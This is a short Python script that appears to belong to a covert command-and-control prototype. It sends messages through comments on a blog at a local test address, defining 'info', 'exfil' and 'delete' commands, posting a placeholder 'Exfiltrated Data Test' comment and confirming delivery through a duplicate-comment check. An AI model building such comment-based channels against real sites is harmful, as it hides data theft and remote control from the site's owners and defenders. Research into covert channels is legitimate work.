#!/usr/bin/env python3

from wpc2 import *
import datetime
import random
import sys

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

commands = [ "info", "exfil", "delete" ]

target_blog = "http://127.0.0.3/"
exfil_channel_id = 5
ack_channel_id = 7

send_time_slot = 11
confirm_time_slot = 33

while True:
    delay_to_timeslot(send_time_slot)

    print("Triggered at: " + str(datetime.datetime.now().time()))

    message_id = generate_random_string(10)
    response = submit_comment(target_blog, exfil_channel_id, message_id + ": Exfiltrated Data Test")
    print(response.html_response)

    delay_to_timeslot(confirm_time_slot)
    response = response = submit_comment(target_blog, ack_channel_id, message_id)
    print("## html_response: " + str(response.html_response))
    if "Duplicate" in response.html_response:
        # If it's duplicated, that means that the server successfully got the message.
        print("[INFO] Message submitted and confirmed.")
        break
    else:
        print("[INFO] Message was not received by server. Resending...")
